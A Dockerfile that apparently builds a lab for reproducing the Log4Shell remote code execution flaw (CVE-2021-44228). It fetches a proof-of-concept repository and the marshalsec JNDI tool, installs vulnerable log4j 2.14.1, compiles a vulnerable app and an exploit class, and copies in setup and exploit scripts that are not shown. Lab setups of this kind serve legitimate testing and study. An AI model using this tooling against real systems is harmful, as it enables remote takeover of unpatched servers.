from ubuntu

run apt update && DEBIAN_FRONTEND="noninteractive" apt install -y git wget unzip openjdk-8-jdk maven python3

run \
    git clone https://github.com/omicronns/CVE-2021-44228-Apache-Log4j-Rce.git && \
    git clone https://github.com/mbechler/marshalsec.git && \
    cd marshalsec && mvn clean package -DskipTests

run cd /CVE-2021-44228-Apache-Log4j-Rce/src/main/java && \
    wget https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-bin.zip && unzip apache-log4j-2.14.1-bin.zip && \
    javac -cp apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar:apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar log4j.java && \
    javac Exploit.java

copy setup.sh /
copy xpl.sh /

cmd /setup.sh
